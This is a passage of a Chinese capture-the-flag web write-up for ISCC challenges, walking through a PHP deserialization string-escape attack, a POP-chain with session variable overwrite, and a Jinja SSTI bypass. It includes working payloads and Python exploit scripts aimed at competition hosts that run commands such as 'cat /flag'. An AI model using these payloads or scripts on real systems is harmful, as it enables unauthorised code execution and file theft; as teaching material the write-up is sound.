class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">        <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">        <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">        <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>继续看源码**，<strong>得到上传路径</strong>，<strong>但是MD5加密了</strong>，**所以后缀是没有了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>这样一来**，**传配置文件也是没用了<br>看到了config.php里面有flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php里面的filter函数里面有preg_replace**，**可能漏洞出现在这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">        <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">        <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br></pre></td></tr></table></figure><p>结合这个猜测是<strong>反序列化的字符串逃逸</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>先分析一下这个过滤：</p><ul><li>implode()函数：<code>implode(separator**,**array)</code><br>把数组里的元素以某字符连接</li><li>preg_replace()函数：<code>preg_replace ( mixed $pattern **,** mixed $replacement **,** mixed $subject</code><br>用第三个参数匹配第一个参数的正则**，**换成第二个参数</li></ul><p>第一个preg_replace()：<br>把<code>'</code>和<code>\\</code>换成<code>_</code></p><p>第二个preg_replace():<br>匹配<code>/select|insert|update|delete|where/</code>换成hacker<br>其他的几个都是六个字符**，<strong>和hacker一样长</strong>，**所以我们选择where来对他进行逃逸</p><p>当我们更新了信息后**，<strong>执行这个方法</strong>，**经过filter过滤后再赋值到$username里面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br></pre></td></tr></table></figure><p>生成这样的序列化字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;11111111111&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;123@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/25a452927110e39a345a2511c57647f2&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>既然photo会被md5加密**，<strong>我们就逃逸出来</strong>，<strong>构造一个photo出来</strong>，<strong>所以 从nickname里面下手</strong>，**把photo的内容改成config.php</p><p>一个where换成hacker会多一个字符**，**<code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>这里一共有33个字符 **，**所以写33个where就刚刚好把伪造的photo给挤出去了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>问题又来了**，**太长了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure><p>绕过方法是<strong>数组绕过</strong>：</p><p>数组绕过的话**，<strong>payload还得改</strong>，**要用<code>&quot;;&#125;</code>来闭合了<br>格式是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;11111111111&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;123@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>所以<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>长度为34<br>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>改为数组形式<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210502174350475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMDc4MjI5,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>成功拿到config.php的源码</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/d9a7ee8c5d19e10820acb5ac2b65c7d8.png"  alt="image-20210518125123108"></p><p>一把嗦脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fuck</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.url = <span class="string">&quot;http://39.96.91.106:7010/&quot;</span></span><br><span class="line">        self.s = requests.session()</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params">self, username</span>):</span></span><br><span class="line">        url = self.url + <span class="string">&quot;register.php&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123123&quot;</span>&#125;</span><br><span class="line">        self.s.post(url, data=data)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">self, username</span>):</span></span><br><span class="line">        url = self.url + <span class="string">&quot;index.php&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123123&quot;</span>&#125;</span><br><span class="line">        self.s.post(url, data=data)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">self</span>):</span></span><br><span class="line">        url = self.url + <span class="string">&quot;update.php&quot;</span></span><br><span class="line">        files = &#123;<span class="string">&quot;photo&quot;</span>: (<span class="string">&quot;fuck&quot;</span>, <span class="string">&quot;123123123123123123123123123123&quot;</span>)&#125;</span><br><span class="line">        data = &#123;<span class="string">&quot;phone&quot;</span>: <span class="string">&quot;11111111111&quot;</span>, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;123@qq.com&quot;</span>, <span class="string">&quot;nickname[]&quot;</span>: </span><br><span class="line">            <span class="string">&#x27;&#x27;&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.s.post(url, data=data, files=files)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">profile</span>(<span class="params">self</span>):</span></span><br><span class="line">        url = self.url + <span class="string">&quot;profile.php&quot;</span></span><br><span class="line">        res = self.s.get(url)</span><br><span class="line">        flag = re.findall(re.<span class="built_in">compile</span>(<span class="string">r&#x27;(?&lt;=base64,).*(?=&quot; class)&#x27;</span>), res.text)</span><br><span class="line">        flag = re.findall(re.<span class="built_in">compile</span>(<span class="string">r&#x27;(?&lt;=flag = \&#x27;).*(?=\&#x27;;)&#x27;</span>), base64.b64decode(flag[<span class="number">0</span>]).decode())</span><br><span class="line">        <span class="built_in">print</span>(flag[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    username = <span class="string">&quot;&quot;</span></span><br><span class="line">    fuck = Fuck()</span><br><span class="line">    fuck.register(username)</span><br><span class="line">    fuck.login(username)</span><br><span class="line">    fuck.update()</span><br><span class="line">    fuck.profile()</span><br></pre></td></tr></table></figure><h2 id="which-is-the-true-iscc"><a class="header-anchor" href="#which-is-the-true-iscc">¶</a>which is the true iscc</h2><p>此WP还是来自CSDN中<a href="https://blog.csdn.net/m0_51078229">huamanggg</a>师傅（我太菜了）</p><p>注释了一些提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/?whatareyounongshane=src&quot;</span>&gt;</span>我真的是源码?<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/?whatareyounongshane=cmd&quot;</span>&gt;</span>干点好事!<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/?whatareyounongshane=upload&quot;</span>&gt;</span>送点东西!<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/?whatareyounongshane=tellmetruth&quot;</span>&gt;</span>快告诉我真相!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>源码里的ISCC_Command类里面的__destruct方法可以执行命令**，**这里应该是最终要走到的点</p><p>这样的话就追着cmd变量来看**，<strong>明显看类名知道</strong>，**会在ISCC_ResetCMD类里面对cmd进行重新赋值<br>这里的__destruct方法必须得满足这个才能重置命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;            <span class="variable">$cmd</span> = <span class="keyword">$this</span>-&gt;new_cmd;        &#125;</span><br></pre></td></tr></table></figure><p>一般来说**，<strong>想要控制$_SESSION的值</strong>，<strong>都是使用变量覆盖来做的</strong>，**这题应该也不例外</p><p>在ISCC__Upload类里面**，**有着这样的一批代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$is_upload</span>) &#123; <span class="keyword">foreach</span> (<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)     <span class="variable">$GLOBALS</span>[<span class="variable">$key</span>] = <span class="variable">$value</span>;</span><br></pre></td></tr></table></figure><p>这个东西：<code>$GLOBALS['key'] = value;</code>　　<br>指的的是PHP当前页面的全局变量$key = value的引用</p><p>当$is_upload为true的时候**，<strong>就会触发这个循环</strong>，<strong>可以实现$_SESSION的变量覆盖<br>而在upload类里面的__wakeup方法里面<code>$is_upload = (count($_FILES) &gt; 0);</code>会把他设置成true</strong>，<strong>其他的类都设置成了false<br>所以我们就要让upload执行__destruct的时候</strong>，<strong>is_upload是true<br>这就要求</strong>，<strong>最早执行__destruct</strong>，**最晚执行__wakeup<br>所以就可以按一定顺序来构造pop链</p><p>由于有一个waf函数**，<strong>不准出现</strong>*，<strong>而$new_cmd属性是protected的</strong>，<strong>序列化了就一定要带</strong>*，**绕过的方法就是16进制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;    </span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$s</span>**,** <span class="string">&quot;*&quot;</span>) !== <span class="literal">FALSE</span>)        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;    <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那我们这样构造pop链：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$new_cmd</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;x=<span class="keyword">new</span> ISCC_Command();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;y=<span class="keyword">new</span> ISCC_ResetCMD();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> ISCC_Upload();</span><br><span class="line"><span class="variable">$c</span>=urlencode(serialize(<span class="variable">$b</span>));</span><br><span class="line"><span class="variable">$c</span>=str_replace(<span class="string">&quot;s&quot;</span>,<span class="string">&quot;S&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$c</span>=str_replace(<span class="string">&quot;%2A&quot;</span>,<span class="string">&#x27;\2a&#x27;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ISCC_Upload%22%3A1%3A%7BS%3A1%3A%22y%22%3BO%3A13%3A%22ISCC_ReSetCMD%22%3A2%3A%7BS%3A10%3A%22%00\2a%00new_cmd%22%3BS%3A9%3A%22cat+%2Fflag%22%3BS%3A1%3A%22x%22%3BO%3A12%3A%22ISCC_Command%22%3A0%3A%7B%7D%7D%7D</span><br></pre></td></tr></table></figure><p>最终的poc：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://39.96.91.106:7050/&quot;</span></span><br><span class="line"></span><br><span class="line">files=&#123;</span><br><span class="line">    <span class="string">&#x27;iscc_file&#x27;</span>:(<span class="string">&quot;b&quot;</span>,<span class="built_in">open</span>(<span class="string">&quot;1.png&quot;</span>,<span class="string">&quot;rb&quot;</span>)),</span><br><span class="line">    <span class="string">&quot;_SESSION&quot;</span>:(<span class="string">&quot;isccIsCciScc1scc&quot;</span>,<span class="string">&quot;123&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r=requests.post(url=url+<span class="string">&quot;??=O%3A11%3A%22ISCC_Upload%22%3A1%3A%7BS%3A1%3A%22a%22%3BO%3A13%3A%22ISCC_ReSetCMD%22%3A2%3A%7BS%3A10%3A%22%00%5C2a%00new_cmd%22%3BS%3A9%3A%22cat+%2Fflag%22%3BS%3A1%3A%22b%22%3BO%3A12%3A%22ISCC_Command%22%3A0%3A%7B%7D%7D%7D&quot;</span>,files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text) </span><br></pre></td></tr></table></figure><h2 id="lovely-ssti"><a class="header-anchor" href="#lovely-ssti">¶</a>lovely ssti</h2><p>参数是xiaodouni</p><p>payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> xiahua=(config|string)[<span class="number">14</span>]%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> gb=(xiahua,xiahua,<span class="string">&quot;globals&quot;</span>,xiahua,xiahua)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bl=(xiahua,xiahua,<span class="string">&quot;builtins&quot;</span>,xiahua,xiahua)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cr=(lipsum|attr(gb)|attr(<span class="string">&quot;get&quot;</span>)(bl))[<span class="string">&quot;ch&quot;</span><span class="string">&quot;r&quot;</span>] %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> dian=cr(<span class="number">46</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xing =cr(<span class="number">42</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> shell=(<span class="string">&quot;find / -name &quot;</span>,xing,<span class="string">&quot;fla&quot;</span>,xing)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> shell4 = <span class="string">&quot;cat /usr/fla??is?here?txt&quot;</span>%&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(gb)|attr(<span class="string">&quot;get&quot;</span>)(<span class="string">&quot;o&quot;</span><span class="string">&quot;s&quot;</span>)|attr(<span class="string">&quot;po&quot;</span><span class="string">&quot;pen&quot;</span>)(shell4))|attr(<span class="string">&quot;read&quot;</span>)()&#125;&#125;</span><br></pre></td></tr></table></figure><p>可参考这篇博客：<a href="https://blog.csdn.net/jvkyvly/article/details/116953370">ISCC SSTI</a><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210525202556996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISCC&#123;SsT1_is_eAsy_T0_lEarn(*~*)&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;MISC&lt;/h1&gt;
&lt;h2 id=&quot;李华的红包&quot;&gt;&lt;a class=&quot;header-anchor&quot; href=&quot;#李华的红包&quot;&gt;¶&lt;/a&gt;李华的红包&lt;/h2&gt;
&lt;p&gt;打开发现是一个图片，binwalk分离下文件后得到一个txt文件，内容如下&lt;/p&gt;
&lt;figure cla</summary>
      
    
    
    
    <category term="CTF-WEB" scheme="https://zss192.github.io/categories/CTF-WEB/"/>
    
    
    <category term="CTF-WEB" scheme="https://zss192.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
